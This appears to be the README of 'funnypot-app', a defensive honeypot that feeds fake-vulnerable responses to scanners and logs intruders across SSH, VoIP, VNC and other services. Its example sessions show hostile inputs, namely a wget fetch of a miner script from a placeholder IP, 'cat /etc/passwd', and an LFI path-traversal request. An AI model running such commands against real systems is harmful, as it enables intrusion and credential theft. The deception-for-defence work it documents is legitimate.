# funnypot-app 🍯

[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![PHP](https://img.shields.io/badge/php-%3E%3D8.0-777bb3.svg)](composer.json)
[![Engine](https://img.shields.io/badge/engine-funnypot--core-blue.svg)](https://github.com/metrictower/funnypot-core)

> **Not sure you're in the right place?**
> - Want a ready-to-run **honeypot box** to deploy → funnypot-app **← you are here**
> - Protecting a **Laravel** app → [funnypot-laravel](https://github.com/metrictower/funnypot-laravel)
> - Protecting a **WordPress** site → [funnypot-wordpress](https://github.com/metrictower/funnypot-wordpress)
> - Detection **and** IP reporting in any PHP app, batteries included → [funnypot](https://github.com/metrictower/funnypot)
> - Embedding the deception/detection **engine** in your own PHP / PSR-15 app → [funnypot-core](https://github.com/metrictower/funnypot-core)
> - Querying / reporting to the **IP-reputation service** from code (the SDK) → [funnypot-mainnet-client](https://github.com/metrictower/funnypot-mainnet-client)
> - Building on the low-level **decision/policy engine** → [funnypot-policy](https://github.com/metrictower/funnypot-policy)

**A honeypot that answers a scanner's probe with the fake-vulnerable response it was fishing for.**

funnypot is the opposite of a [nuclei](https://github.com/projectdiscovery/nuclei) scanner. A scanner
sends a probe and reads the reply to decide "this host is vulnerable". funnypot reads the incoming probe
and writes back the reply that the scanner's own matcher is looking for. The scanner leaves with a full,
believable, completely wrong vulnerability report, and you log every move it made.

This repo is the **standalone honeypot app**: a Docker image that stands the whole thing up on your own
box. It runs the HTTP deception engine across the common web ports and adds 38 network-service honeypots
(a real pure-PHP SSH server, an Asterisk-persona **VoIP PBX** that answers scam calls with recorded
voices, a telnet fake shell, redis, ftp, smtp, mysql, postgres, mongodb, modbus and more). Every
listener is fault-isolated and auto-respawned, so one bad packet can't take a service down. It ships
with a live dashboard and an admin panel to switch each fake on or off.

The HTTP engine itself is a separate Composer package, [`metrictower/funnypot-core`](https://github.com/metrictower/funnypot-core).
Use that if you want to drop the inversion engine into your own Laravel or PSR-15 app instead of running
the box. This app depends on it.

> Defensive deception for infrastructure you own. Every fake is inert: `example.com` hosts, RFC-5737
> documentation IPs, obviously-fake secrets. Never a real or working credential.

---

## Dashboard

Every hit streams onto a live dashboard: HTTP probes, and SSH, telnet, redis and other connections, with
top talkers, which templates fired, hourly activity and a GeoIP attacker map. One-click quick-filters slice
the stream by category — SSH/telnet commands, credential attempts, spider-trap hits, and **fake-admin-panel
navigation** (`event=panel`) — and a free-text path search drills into any section (`/admin/bank`, …).

![funnypot dashboard](docs/img/dashboard.png)

The admin panel is the **emulation catalog**: one toggle per capability, so you decide exactly which
CVEs, attack classes and services this box pretends to be.

![emulation catalog toggles](docs/img/emulations.png)

---

## Quick start (Docker)

The [`demo/`](demo/) directory is a complete front controller: a welcome homepage and live dashboard at
`/`, with every other request run through the engine and logged. The image runs nginx and php-fpm across
the web ports and launches all 38 service listeners (each auto-respawned if it ever exits).

```bash
# compose
cd demo && docker compose up --build

# or plain docker
docker build -f demo/Dockerfile -t funnypot . && docker run --rm \
  -p 80:80 -p 443:443 -p 8080:8080 -p 2222:2222 funnypot
```

Open <http://localhost:8080> for the dashboard, then act like an attacker: point a scanner, curl, or an
`ssh` or `telnet` client at it and watch the hits land. Deployment helpers live in
[`scripts/deploy.sh`](scripts/deploy.sh); more detail in [`demo/README.md`](demo/README.md).

> Point it only at your own infrastructure, and expose it on ports you control. It is a decoy for
> scanners, not a service.

---

## What an attacker sees

**An SSH session.** The pure-PHP SSH server runs the real crypto handshake, accepts any password, and
drops into a fake shell. Every command is logged. None is ever run:

```console
$ ssh -p 2222 root@honeypot.example
root@honeypot.example's password:              # any password is accepted
Last login: Mon Aug 18 09:14:02 2026 from 10.0.0.1
root@web01:~# whoami
root
root@web01:~# uname -a
Linux web01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
root@web01:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
root@web01:~# wget http://203.0.113.9/miner.sh     # URL logged as intel, the file is NEVER fetched
--2026-08-18 09:14:31--  http://203.0.113.9/miner.sh
Resolving 203.0.113.9... 93.184.216.34
Connecting to 203.0.113.9|93.184.216.34|:80... connected.
HTTP request sent, awaiting response... 200 OK
root@web01:~# exit
logout
```

**A web scanner or curl.** A probe for an exposed git repo and an LFI attempt, both answered with an
inert fake. No file is ever read:

```console
$ curl -s http://honeypot.example/.git/config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://git.example.com/internal/platform.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

$ curl -s 'http://honeypot.example/index.php?page=../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
```

Run a whole scan against it and dozens of "findings" light up on the dashboard:
`nuclei -u http://localhost:8080 -t http/exposures/`.

---

## What it emulates

| Capability | What it does |
|---|---|
| **Nuclei inversion** | About 6,300 templates compiled into route personas; a scanner's own matcher is satisfied by an inert fake. |
| **Attack-class emulators** (31) | Reflect LFI, SQLi, command injection, SSTI, XXE, shellshock, Struts OGNL, open redirect, reflected XSS and IMDS on any path, with canned inert markers (`root:x:0:0…`, `uid=0(root)…`). |
| **Product and route decoys** (26) | Believable `.git/config`, `.env`, `xmlrpc`, `wp-config`, `phpinfo`, `.htpasswd`, `server-status`, `package.json`, SSH keys, SQL dumps, phpMyAdmin, Tomcat manager and more. Data-bearing decoys are filled by shared seeded generators, so people and records are coherent per deployment, not repeated `jdoe`/`example.com` rows. |
| **LLM fake pages** (long-tail fallback) | On a template / CRS / nuclei miss, a probe-gated model fills a small JSON slot-set that a trusted PHP shell renders into a full styled page — WordPress, phpMyAdmin, Grafana, AdminLTE or a generic admin look — with seeded, coherent fake people and records. It only ever *upgrades* a plain 404; the HTTP status and content-type stay app-chosen, and every value is escaped by construction. |
| **Pure-PHP SSH-2.0 server** | Real curve25519-sha256 key exchange, ed25519 host key, aes256-ctr and hmac-sha2-256 transport. No libssh, no OpenSSH. Accept-all auth drops the attacker into a fake shell with decoy files. |
| **TCP protocol emulators** (20) | ssh, telnet, redis, ftp, smtp, memcached, pop3, imap, finger, vnc, rsync, clamav, zookeeper, mysql, postgres, mongodb, modbus, ethernet-ip, **rdp**, **smb**. Every command logged, nothing run. |
| **RDP + SMB credential traps** | Pure-PHP **RDP** (3389, X.224/MCS) logs the `mstshash` username a brute-forcer sprays + the requested security protocols; **SMB2** (445, NTLMSSP) captures crackable net-NTLMv2 hashes (user/domain/workstation) and SMB1 EternalBlue-style probes. Both answer plausibly, grant no session, share no file, execute nothing. |
| **Database, IoT & directory traps** | **MSSQL/TDS** (1433) de-obfuscates + logs the SQL login (user/password/host/app), then (high mode, default) accepts it and serves a fake authenticated session — recon queries (`@@version`, `sys.databases`, `system_user`, ...) answered with seeded persona result-sets, and the `sp_configure` -> `xp_cmdshell` / `xp_dirtree` / OLE / `OPENROWSET` exploitation chain trapped: the full attacker command is captured while plausible inert output is returned (`FUNNYPOT_MSSQL_MODE=low` restores the deny path); **MQTT** (1883) captures CONNECT creds + client id and SUBSCRIBE/PUBLISH topics + payloads; **SNMP** (161/udp) logs the brute-forced community string + requested OIDs, answering only the system group with anti-amplification (reply never exceeds request, per-IP throttle); **LDAP** (389) captures bind DN + password + search filters. All inert — never authenticate, serve no real data, broker/execute nothing. |
| **SCADA, camera & device traps** | **S7comm** (102, Siemens PLC) answers the COTP/S7 handshake with a plausible S7-1200/300 identity + logs memory-read / SZL enumeration; **ADB** (5555, Android Debug Bridge) presents an auth-free device and captures the `shell:`/`exec:` commands + pushed payloads botnets deliver; **BACnet** (47808/udp, building automation) answers Who-Is/ReadProperty with a persona device (anti-amplification) + logs point enumeration; **RTSP** (554, cameras/DVRs) captures the requested stream path (model fingerprint) + Basic/Digest credentials, returns a plausible SDP but streams no real media. Inert — nothing executed, streamed, or actuated. |
| **ICS, BMC, IoT & AD traps** | **DNP3** (20000) answers the link/application layers as a SCADA outstation + logs master addresses and object enumeration, refusing every control function (nothing actuated); **IPMI** (623/udp) captures RAKP usernames (the CVE-2013-4786 hash-disclosure vector) + auth attempts and never grants a session (anti-amplification); **CoAP** (5683/udp) captures the method + Uri-Path/Query + payload, refusing writes (anti-amplification); **Kerberos** (88) captures the AS-REQ principal + realm (AS-REP-roasting / user enumeration) and returns a KRB-ERROR, issuing no ticket. All inert. |
| **SIP / VoIP PBX honeypot** | A high-interaction Asterisk-persona SIP service on 5060 (UDP + TCP) with RTP media on 10000/udp. Accepts weak/default SIP credentials (latched so a spray tool sees exactly one working password), then answers calls with a per-caller cycle of **real recorded voice personas** (Lenny, El Chango, 1913 "Cohen on the Telephone", …) that tarpit the caller — recording both ends as stereo audio with faint line-hiss so it never reads as dead silence. Captures **DTMF** (RFC 4733 + SIP INFO) and **SIP MESSAGE** smishing/spam bodies. Attributes each caller (User-Agent, tool guess — SIPVicious/sipcli/…, transport tells) and reports VoIP fraud to AbuseIPDB (category 8). Byte-faithful to Asterisk (Server-only headers, `501` to unknown methods, `received=/rport=`) to survive scanner fingerprinting. Hardened against RTP reflection/amplification + per-IP flooding, fault-isolated so a bad message never crashes the listener; never bridges, dials, relays, or executes anything. Reachable on extra SIP ports (5061, 5080) for wider scanner discovery, with a companion **STUN** responder (3478/udp) rounding out the VoIP footprint (Binding-only, anti-amplification, no TURN relay). |
| **Docker Engine API decoy** (opt-in) | A believable unauthenticated `dockerd` on 2375/2376 — `/_ping`, `/version`, `/info`, `/containers/json`, `/images/json` plus `/containers/create` + `/containers/{id}/start` (versioned `/v1.NN/…` paths too). Crypto-miner botnets scan 2375 to deploy XMRig; the decoy returns simulated create/start success and **captures the image + command they tried to run**, spawning nothing. Deterministic per deploy seed. Enable with `FUNNYPOT_DOCKER_API=1`. |
| **Emulation catalog** | Auto-registering list of every capability; a sparse JSON file, or the dashboard, toggles each on or off. |
| **Anti-fingerprint** | One coherent product persona per attacker (deterministic, spoof-proof seed) instead of an impossible "vulnerable to everything" host. Per-host self-signed certs, consistent `X-Powered-By`, a tamper-evident honeytoken cookie. |

The attack, decoy and nuclei-corpus capabilities all come from the [`funnypot-core`](https://github.com/metrictower/funnypot-core)
engine. The SSH server, the VoIP PBX, the TCP protocol emulators and the dashboard live in this repo.

---

## The deep admin panel

On an admin-shaped path (`/admin`, `/panel/…`, `/dashboard`, `/manage`, `/console`, `/cp`, `/wp-admin`,
`/phpmyadmin`, `/grafana`, …) the LLM tier serves a **deep, explorable fake corporate office panel** — the
marquee lure, built for *hours* of exploration. It renders **deterministically from a seeded skin, with no
model call**, so it is always available (never blocked on the sidecar) and byte-identical per deploy. A
dev-style **debug-mode banner** ("bound to `0.0.0.0`, auth off") rides every page to explain — in-narrative
— why an admin panel is publicly reachable at all, so the exposure reads as a misconfiguration, not a trap.

At its **root-mounted** paths (`/admin`, `/dashboard`, `/manage`, `/console`, `/cp`, `/panel`, `/administrator`,
and every sub-path) the panel takes precedence over the engine's nuclei-reflection corpus — which also matches
those bare mount segments and would otherwise shadow the panel's own landing page and log the hit as `nuclei`.
A genuine attack payload aimed at a panel path (SQLi/XSS/RCE) still wins and is served, labelled and reported as
an attack.

**What's in it.** A "control-everything" building + business dashboard, roughly 26 modules behind a grouped
sidebar: HR (org chart, directory, payroll), Finance (AP/invoices), **Bank & Treasury**, HVAC, CCTV,
lighting/blinds, access control, fire & life-safety, environment sensors, energy/metering, IT assets
(CMDB), IT services (helpdesk, printers, licences), network/VPN/VoIP, facilities (floorplan, rooms, work
orders), appliances/AV/elevators, plus a global search and activity feed. Every screen is deep — lists
paginate, entities have detail pages and sub-tabs, controls have leaves.

**The bank greed-lure** (`/admin/bank`) is the top-tier time-sink: a wire flow that passes a fake SMS-2FA,
shows "submitted", then reads as **reversed for compliance** in the ledger; an approver 2FA-"bypass"
illusion that still needs a second approver; corporate cards with **Luhn-valid** PANs on sandbox BINs;
an ETH **"cold wallet" reserve** showing a few *real, on-chain-verifiable* addresses (the hook — real
balances an attacker can confirm but never spend) surrounded by **masked fake** addresses/tx-hashes; a
downloadable `wallet.json` keystore whose key material is nonsense; and an ETH **staking** view whose
unstake always fails and whose rewards feed shows live "Nh ago" ages.

**Invariants.** Everything is **100% inert** — no real SMS/transfer/broadcast/exec, no external call on the
request path; the scary money/control verbs never return "done", they land on a guarded soft-deny or a
complete-then-reverse. A **fake persistence layer** makes the panel look stateful for a stored-vuln probe:
a note/message/edit POSTed to a write endpoint (an HR profile edit, a signage broadcast) is echoed back on
a later read of the same view — but only **HTML-escaped** (never executable, **no stored XSS**), **keyed per
visitor** (ip + persona seed), **bounded** (per-value length + per-view count + a global cap) and **TTL'd**
so it evaporates; a PIN/access-code field is never captured or reflected. Every page is otherwise a **pure
function of the deploy seed + URL** (a reload is byte-identical), **escape-by-construction**, and
**fingerprint-safe**. Panels are **exempt from the per-IP velocity/bulk-scan gate** so a human can explore
freely without self-pinning to 404s (renders are cheap + cached). The exceptions to "cached/frozen" are the
staking rewards feed (a live relative age) and a persistence-eligible view (which reflects that visitor's
own recent submission) — both deliberately cache-exempt so an echo is never frozen or served to another ip. Data is seeded + coherent (one persona/company per deploy),
arithmetic reconciles (cash-on-hand = Σ balances, ledgers, payroll), and cross-module facts agree — kept
honest by an ongoing realism-hardening pass so the fakery holds up under an attacker's scrutiny.

Architecture: `PanelRoute` (a positional path parser) + `PanelRegistry` (one class per module) + the
`AdminLteSkin` chrome + ~26 seeded `Fake\*` generators, all under `src/App/Render/`. The fake-persistence
layer is `FakePersistence` (request-scoped facade: write-endpoint mapping + view keys) over
`FakePersistenceStore` (a bounded, TTL'd SQLite store, keyed per ip + persona seed).

---

## Response styles

Set with the `FUNNYPOT_STYLE` environment variable (the demo defaults to `realistic`):

| Style | What the attacker gets |
|---|---|
| `minimal` | Just the tokens the matcher needs. Smallest. |
| `realistic` | A believable fake: a full `.git/config`, a plausible `.env`, a real XML-RPC `methodResponse`. All values inert. |
| `taunt` | Still satisfies the scanner (time still wasted) and adds a visible "honeypot, your scan was logged" marker. |

Fuller content is checked against the matcher before use. If a fuller body would not satisfy the scanner
it falls back to minimal, so the extra detail can never break the guarantee.

`FUNNYPOT_VNC_STYLE` overrides the global style for the VNC honeypot alone (deployments always set the
global — the Docker image defaults it to `realistic` — so a per-service override must win to mean
anything). Under `taunt`, the VNC desktop shows a realistic fake ETH staking wallet desktop (with the
taskbar clock repainted to the live date/time) and an arrow cursor, and the clipboard is hijacked on
connect. Nothing else fires until the attacker interacts — a bot that only connects and screenshots is
left alone, and an idle client is held for `FUNNYPOT_VNC_IDLE_TIMEOUT` (default 900s) so a lurker
watching to see if the box is in use stays engaged. The first click or keypress springs a two-phase
trap: a fake `Reverse VNC connection?` Windows dialog appears (`FUNNYPOT_VNC_POPUP_DELAY`, default 2s)
and dodges the pointer so it can never be clicked (`FUNNYPOT_VNC_DODGE_POPUP`); then a scripted
slideshow plays — `ah-ah-ah` (0.5s) → a generic gray `Reversing VNC connection` panel (1s) →
`evil-troll` (1s) → a generic gray `A new VNC application has been installed` panel (1.5s),
the window resizing to each frame — followed by a burst of invalid RFB (a bogus version banner, a
rectangle with an unknown encoding, a length-lying clipboard message, unknown message types) to
confuse the viewer (`FUNNYPOT_VNC_MALFORMED_EXIT`), and a disconnect. A reconnecting client walks
straight back into it. Frame buffering is capped so a client that stops reading can never exhaust the
listener's memory.

Every VNC hit is logged as a recon trail — `version`, `auth_select`, `encodings` (the ordered encoding
list fingerprints the client tool), `screen_viewed` (the first framebuffer request), `unknown_msg`
(extension probes) and any `client_clipboard` — so a bot that "does nothing" still shows what it
inspected.

## The emulation catalog

Every capability funnypot can emulate (attack classes, product decoys, protocol services, the nuclei
corpus) is listed in a derived, auto-registering catalog. You control it through a sparse JSON file
(`funnypot-vulns.json`) or the dashboard's toggle panel. Only changes from a capability's default need to
be recorded, so a newly-added template shows up on its own at its declared default:

```json
{ "version": 1, "vulns": { "attack-cmdi-unix": false, "service-telnet": false, "nuclei-reflection": true } }
```

A disabled service does not bind, a disabled attack rule is skipped, and `nuclei-reflection` off drops all
nuclei-derived fakes. See [`docs/EMULATION-CATALOG.md`](docs/EMULATION-CATALOG.md).

## Safety and invariants

funnypot is built so it can only ever mislead an attacker, never help one.

- **Emulate output, never run input.** The fake shell is a lookup table: no `exec`, `proc_open` or
  `eval`, no real filesystem, no outbound socket. `wget` and `curl` return canned text and the URL is
  logged, never fetched.
- **Reflect, never harm.** No decompression bombs (decoy archives are small + bounded, a few KB to ~1 MB), no retaliation, no
  outbound requests. Every response is size-capped.
- **Reflect only escaped, never execute.** Attacker input is not reflected, except the deep panel's
  fake-persistence layer, which echoes a submitted note/message/edit back **HTML-escaped** (bounded,
  per-visitor, TTL'd — never executable, no stored XSS). No request body is ever `unserialize()`d, and
  every synthesized header is CRLF and NUL safe.
- **Coherent personas.** One believable host per attacker, deterministically seeded, not an impossible
  "vulnerable to everything" fingerprint a real analyst would spot.
- **The LLM only upgrades a 404.** The optional page-realism model can only turn a plain 404 into a richer
  believable page; any model fault degrades back to that 404, never to a 500 (a 500 is itself a tell). It
  never chooses the HTTP status or content-type.
- **Inert fakes only.** `example.com` hosts, RFC-5737 IPs, obviously-fake keys and hashes. Never a real
  or working secret.

## Use the engine in your own app

If you want the HTTP inversion engine inside an existing app rather than a whole honeypot box, use the
Composer package instead of this repo:

```bash
composer require metrictower/funnypot-core
```

It is inert by default (detect-only, gate closed), with an opt-in respond mode and a Laravel drop-in. See
the [funnypot-core README](https://github.com/metrictower/funnypot-core) for the integration guide.

## Testing

```bash
composer install
composer test          # full suite in parallel across all cores (~6s)
composer test:fast     # parallel, minus the seeded-panel render tests (quickest smoke)
composer test:serial   # single process (deterministic ordering / debugging)
```

Tests are pure PHPUnit (no DB or container). The parallel runner is
[paratest](https://github.com/paratestphp/paratest); the seeded fake-data generators memoize per
`(seed, domain)` so the panel render tests don't rebuild the same roster on every assertion —
together these take the suite from minutes to seconds. `vendor/bin/phpunit` still works for a plain
serial run.

The engine has its own test suite in the [`funnypot-core`](https://github.com/metrictower/funnypot-core) repo,
including a golden test that runs real nuclei against a live server.

## Build-time helpers

The compiled artifacts under `resources/compiled/` are committed, so a normal run needs no build step.
To regenerate them after editing templates:

```bash
bin/funnypot compile-protocols     # templates/protocol -> the TCP emulator table
bin/funnypot compile-catalog       # derive the emulation catalog (app + engine templates)
bin/funnypot vulns:sync            # refresh the on/off toggle list
```

## Docs

- [`demo/README.md`](demo/README.md): running the standalone honeypot.
- [`docs/EMULATION-CATALOG.md`](docs/EMULATION-CATALOG.md): the configurable capability surface.
- [`docs/PROTOCOL-HONEYPOT-PLAN.md`](docs/PROTOCOL-HONEYPOT-PLAN.md): the TCP service emulators and SSH server.
- [funnypot-core](https://github.com/metrictower/funnypot-core): the HTTP inversion engine, its spec and its integration guide.

## Licence

MIT. See [LICENSE](LICENSE). The nuclei inversion engine is derived in part from
[projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
(MIT, © 2025 ProjectDiscovery, Inc.); the upstream notice ships with the
[funnypot-core](https://github.com/metrictower/funnypot-core) engine.
